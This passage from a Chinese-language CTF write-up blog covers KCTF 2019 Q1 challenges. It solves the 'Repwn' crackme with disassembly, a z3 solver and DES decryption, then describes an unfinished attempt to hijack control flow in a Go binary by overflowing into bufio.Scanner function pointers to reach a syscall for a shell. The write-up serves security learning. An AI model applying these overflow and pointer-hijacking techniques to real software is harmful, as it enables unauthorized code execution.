class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x03-Repwn"><a href="#0x03-Repwn" class="headerlink" title="0x03 Repwn"></a>0x03 Repwn</h2><p>首先从第八位对预定义字符串进行比较：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00401350                 movzx   eax, byte ptr [edx+ebp-38h]</span><br><span class="line">.text:00401355                 cmp     al, [ecx+ebx]</span><br><span class="line">.text:00401358                 jnz     short loc_40136C</span><br><span class="line">.text:0040135A                 inc     edx</span><br><span class="line">.text:0040135B                 inc     ecx</span><br><span class="line">.text:0040135C                 cmp     edx, 0Bh</span><br><span class="line">.text:0040135F                 jle     short loc_401350</span><br></pre></td></tr></table></figure>
<p>即X1Y0uN3t<br>而后在sub_401460中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401460</span><span class="params">(<span class="keyword">char</span> *Str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Dest; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) == <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_4013B0((<span class="keyword">int</span>)Str) )</span><br><span class="line">    &#123;</span><br><span class="line">      Str[<span class="number">20</span>] -= <span class="number">88</span>;</span><br><span class="line">      Str[<span class="number">21</span>] -= <span class="number">70</span>;</span><br><span class="line">      Str[<span class="number">22</span>] -= <span class="number">3</span>;</span><br><span class="line">      Str[<span class="number">23</span>] -= <span class="number">107</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;Dest, Str);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"String Length is Wrong"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先判断了字符串长度<br>而后进入sub_4013B0，是几个方程判断：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4013B0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  str_to_num(a1);</span><br><span class="line">  v1 = num[<span class="number">3</span>] + <span class="number">1000</span> * num[<span class="number">0</span>] + <span class="number">100</span> * num[<span class="number">1</span>] + <span class="number">10</span> * num[<span class="number">2</span>];</span><br><span class="line">  v2 = num[<span class="number">5</span>] + <span class="number">10</span> * num[<span class="number">4</span>];</span><br><span class="line">  v3 = num[<span class="number">7</span>] + <span class="number">10</span> * num[<span class="number">6</span>];</span><br><span class="line">  result = <span class="number">2</span> * (v1 + v2);</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">0xFC8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">3</span> * v2 / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( result + <span class="number">100</span> * v3 == <span class="number">0x73</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v1 - <span class="number">110</span> * v3 != <span class="number">0x76C</span> )</span><br><span class="line">        result = <span class="built_in">printf</span>(<span class="string">"Key_Is_Wrong,Please_Input_Again!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大致推测前八位为十进制字符且分成三个数v1，v2，v3，而后由方程组解出三个数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">z=Int(<span class="string">'z'</span>)</span><br><span class="line">solver=Solver()</span><br><span class="line">solver.add((<span class="number">2</span>*(x+y))%<span class="number">0xffffffff</span>==<span class="number">0xfc8</span>)</span><br><span class="line">solver.add((<span class="number">2</span>*(x+y))%<span class="number">0xffffffff</span>==<span class="number">0xfc8</span>)</span><br><span class="line">solver.add((<span class="number">3</span>*y/<span class="number">2</span>+<span class="number">100</span>*z)%<span class="number">0xffffffff</span>==<span class="number">0x73</span>)</span><br><span class="line">solver.add((x<span class="number">-110</span>*z)%<span class="number">0xffffffff</span>==<span class="number">0x76c</span>)</span><br><span class="line">solver.add(x&lt;<span class="number">9999</span>)</span><br><span class="line">solver.add(y&lt;<span class="number">99</span>)</span><br><span class="line">solver.add(x&gt;<span class="number">0</span>)</span><br><span class="line">solver.add(y&gt;<span class="number">0</span>)</span><br><span class="line">solver.add(z&gt;<span class="number">0</span>)</span><br><span class="line">solver.add(z&lt;<span class="number">99</span>)</span><br><span class="line">print(solver.check())</span><br><span class="line">print(solver.model())</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sat</span><br><span class="line">[z &#x3D; 1, y &#x3D; 10, x &#x3D; 2010]</span><br></pre></td></tr></table></figure>
<p>即前面8位为20101001<br>最后可以看到最后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Str[<span class="number">20</span>] -= <span class="number">88</span>;</span><br><span class="line">Str[<span class="number">21</span>] -= <span class="number">70</span>;</span><br><span class="line">Str[<span class="number">22</span>] -= <span class="number">3</span>;</span><br><span class="line">Str[<span class="number">23</span>] -= <span class="number">107</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(&amp;Dest, Str);</span><br></pre></td></tr></table></figure>
<p>存在溢出，类似2017年的一题<br>需要我们跳到另一处判断<br>我是通过字符串引用看到sub_4018B0处代码<br>上层引用看到401BF0处代码未定义，且有printf和system等操作（可疑）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">key=[</span><br><span class="line">  <span class="number">0xf0</span>, <span class="number">0x1b</span>, <span class="number">0x40</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line">key[<span class="number">0</span>]+=<span class="number">88</span></span><br><span class="line">key[<span class="number">1</span>]+=<span class="number">70</span></span><br><span class="line">key[<span class="number">2</span>]+=<span class="number">3</span></span><br><span class="line">key[<span class="number">3</span>]+=<span class="number">107</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">  x+=chr(i%<span class="number">256</span>)</span><br><span class="line"><span class="keyword">print</span> x</span><br></pre></td></tr></table></figure>
<p>可以得到最后4字节HaCk<br>输入20101001X1Y0uN3tG00d即可跳到另一处加密<br>会再次输入并检测字符串，这里通过程序流的关键处理步骤，（好像PiED的插件也可以）可以看出是DES加密，密钥为XiyouNet（开始我把子秘钥位置当做密钥二进制卡了一大会，犯傻了）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">key = <span class="string">'XiyouNet'</span></span><br><span class="line">kirin=DES.new(key,DES.MODE_ECB)</span><br><span class="line">s=kirin.decrypt(<span class="string">"\x9d\xb0\x84\xac\x97\x04\x1e\x30"</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="comment">#Wel1C0me</span></span><br><span class="line"><span class="comment">#Currect,Flag_Format_Is_Input1+Input2</span></span><br></pre></td></tr></table></figure>
<p>第二步字符串：Wel1C0me</p>
<h2 id="0x04-挖宝"><a href="#0x04-挖宝" class="headerlink" title="0x04 挖宝"></a>0x04 挖宝</h2><p>先说明一个错误思路：<br>首先通过字符串判断是个go程序，使用golanghelper恢复符号表：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-8fd2cb1e46b27355.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="符号表"><br>首先可以看到四个宝藏位置：(0,5),(5,0),(5,5),第4个没想到办法绕<br>当获得宝藏后会调用main_treasure：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int64)&amp;retaddr &lt;= *(_QWORD *)(__readfsqword(<span class="number">0xFFFFFFF8</span>) + <span class="number">16</span>) )</span><br><span class="line">  a3 = runtime_morestack_noctxt(note, a2, a4);</span><br><span class="line">main_print(a3, a4, note, a2, a5, r9_0, (__int64)<span class="string">"Please leave a message &gt;&gt; "</span>, <span class="number">26L</span>L);</span><br><span class="line">main_scan(note, a2, v7, v8, v9, v10);</span><br><span class="line">v17 = main_memcpy(note, a2, v11, v12, v13, v14, a6, v15, v16);</span><br><span class="line"><span class="keyword">return</span> main_println(v17, v18, note, a2, v19, v20, (__int64)<span class="string">"Please continue your journey!"</span>, <span class="number">29L</span>L);</span><br></pre></td></tr></table></figure>
<p>即获取一次输入并copy到预先分配的一个位置，而这个位置分配的空间大小为0x30，因此这里存在溢出(具体go的内存分配机制可以在网上找到)<br>继续看可以发现main_scan内：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0xFFFFFFF8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)&amp;retaddr &gt; *(_QWORD *)(v6 + <span class="number">16</span>) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  runtime_morestack_noctxt(a1, a2, a3);</span><br><span class="line">&#125;</span><br><span class="line">bufio__ptr_Scanner_Scan(a1, a2, a3, v6, a5, a6, io_arg);</span><br><span class="line">v10 = io_arg;</span><br><span class="line">v15 = <span class="number">0L</span>L;</span><br><span class="line">v16 = <span class="number">0L</span>L;</span><br><span class="line"><span class="keyword">if</span> ( !io_arg )</span><br><span class="line">  *(_DWORD *)io_arg = io_arg;</span><br><span class="line">v12 = *(_OWORD *)(v10 + <span class="number">0x20</span>);</span><br><span class="line">v13 = *(_QWORD *)(v10 + <span class="number">0x30</span>);</span><br><span class="line">runtime_slicebytetostring((__int64)&amp;v12, a2, v7, v13, v8, v9, <span class="number">0L</span>L, (<span class="keyword">const</span> __m128i *)v12, *((__int64 *)&amp;v12 + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> v14;</span><br></pre></td></tr></table></figure>
<p>注意到一个Scanner结构体io_arg,动态调试看到其分配位置0xC820018080(在本地开启随机化调试也会一直是此地址，基本上go内部实现的栈空间地址不会改变，但是通过pwntools启动地址会不同（虽然也不改变），不太明白为什么)，这个位置距离溢出位置0x00000C8200122D0不是太远，调试中可以看到能被覆盖，在go的源码中看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">type Scanner <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	r            io.Reader <span class="comment">// The reader provided by the client.</span></span><br><span class="line">	split        SplitFunc <span class="comment">// The function to split the tokens.</span></span><br><span class="line">	maxTokenSize <span class="keyword">int</span>       <span class="comment">// Maximum size of a token; modified by tests.</span></span><br><span class="line">	token        []<span class="keyword">byte</span>    <span class="comment">// Last token returned by split.</span></span><br><span class="line">	buf          []<span class="keyword">byte</span>    <span class="comment">// Buffer used as argument to split.</span></span><br><span class="line">	start        <span class="keyword">int</span>       <span class="comment">// First non-processed byte in buf.</span></span><br><span class="line">	<span class="built_in">end</span>          <span class="keyword">int</span>       <span class="comment">// End of data in buf.</span></span><br><span class="line">	err          error     <span class="comment">// Sticky error.</span></span><br><span class="line">	empties      <span class="keyword">int</span>       <span class="comment">// Count of successive empty tokens.</span></span><br><span class="line">	scanCalled   <span class="keyword">bool</span>      <span class="comment">// Scan has been called; buffer is in use.</span></span><br><span class="line">	done         <span class="keyword">bool</span>      <span class="comment">// Scan has finished.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到其包含了两个函数指针，在ida中也可以看到有两处可以利用函数指针劫持程序流(bufio__ptr_Scanner_Scan函数)：<br>1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov     [rsp+1B8h+var_18], r10</span><br><span class="line">mov     [rsp+1B8h+var_1B8], r10 ; 1</span><br><span class="line">mov     [rsp+1B8h+var_10], r8</span><br><span class="line">mov     [rsp+1B8h+var_1B0], r8</span><br><span class="line">mov     [rsp+1B8h+var_8], r9</span><br><span class="line">mov     [rsp+1B8h+var_1A8], r9</span><br><span class="line">mov     rbp, [rax+60h]</span><br><span class="line">cmp     rbp, 0</span><br><span class="line">setnz   byte ptr [rsp+1B8h+var_1A0]</span><br><span class="line">mov     rdx, [rax+10h]</span><br><span class="line">mov     rbx, [rdx]</span><br><span class="line">call    rbx</span><br></pre></td></tr></table></figure>
<p>2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov     [rsp+1B8h+var_48], r10</span><br><span class="line">mov     [rsp+1B8h+var_1B0], r10</span><br><span class="line">mov     [rsp+1B8h+var_40], r8</span><br><span class="line">mov     [rsp+1B8h+var_1A8], r8</span><br><span class="line">mov     [rsp+1B8h+var_38], r9</span><br><span class="line">mov     [rsp+1B8h+var_1A0], r9</span><br><span class="line">mov     [rsp+1B8h+var_A0], rbp</span><br><span class="line">mov     [rsp+1B8h+var_1B8], rbp</span><br><span class="line">mov     [rsp+1B8h+var_A8], rcx</span><br><span class="line">mov     rbx, [rcx+20h]</span><br><span class="line">call    rbx</span><br></pre></td></tr></table></figure>
<p>所以我们根据对应条件来覆盖函数指针并劫持程序流即可，不过很容易发现，一旦覆盖，原本应该调用os__ptr_File_Read来获取输入流，覆盖后就完全没有办法控制程序，所以这里需要保证可以直接获取shell，观察程序，看到了go内部实现的syscall_Syscall:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call    runtime_entersyscall</span><br><span class="line">mov     rdi, [rsp+arg_8]</span><br><span class="line">mov     rsi, [rsp+arg_10]</span><br><span class="line">mov     rdx, [rsp+arg_18]</span><br><span class="line">xor     r10d, r10d</span><br><span class="line">xor     r8d, r8d</span><br><span class="line">xor     r9d, r9d</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>可以看到这里会根据栈中参数调用syscall<br>但是因为地址随机化，只能在go本身分配的栈中（地址确定）找是否含有此函数的指针，在0x00000C820000200处会一直存在syscall_Syscall+5<br><img src="https://upload-images.jianshu.io/upload_images/7434375-f58aef2538efaa46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="syscall"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, [rsp+arg_8]</span><br><span class="line">mov     rsi, [rsp+arg_10]</span><br><span class="line">mov     rdx, [rsp+arg_18]</span><br><span class="line">xor     r10d, r10d</span><br><span class="line">xor     r8d, r8d</span><br><span class="line">xor     r9d, r9d</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>不过最后我卡在了参数构造上，最接近的构造结果时syscall(0x3b,”/bin/sh”,……,……)，后面还需要两个参数(0,0)，但是通过源码和静态汇编都可以看出没办法实现（源码详见/src/bufio/scan.go）(不排除有办法但是我审错了，但是实在没时间看了)<br>最后结果：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-4314dcfd4a163995.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="syscall"><br>可以看到因为后面两个参数无法控制失败了，不过确实劫持了程序流到伪造的syscall_Syscall<br>虽然失败了,不过想来以后这个可能能用上，先记下来<br>实际上如果有leak，leak程序加载基址后完全可以伪造整个Scanner结构体造成任意地址写（buf可控），而栈地址已知，后面很简单就可以拿shell，或者leak libc后直接one_gadget来获得shell都可以，不过没想到leak方法才采取syscall方案，感觉预期解是利用go内存分配机制伪造span list指针啥的，不过没想到好的利用技巧，再加上时间上的不允许，只试验了这个方法<br>等抽时间彻底看完go的内存分配机制再来更新</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-拯救单身狗"><span class="toc-number">1.</span> <span class="toc-text">0x01 拯救单身狗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-C与C"><span class="toc-number">2.</span> <span class="toc-text">0x02 C与C++</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Repwn"><span class="toc-number">3.</span> <span class="toc-text">0x03 Repwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-挖宝"><span class="toc-number">4.</span> <span class="toc-text">0x04 挖宝</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/22/KCTF-2019-Q1/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&text=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&is_video=false&description=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=KCTF 2019 Q1&body=Check out this article: http://yoursite.com/2019/03/22/KCTF-2019-Q1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&title=KCTF 2019 Q1" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/22/KCTF-2019-Q1/&name=KCTF 2019 Q1&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


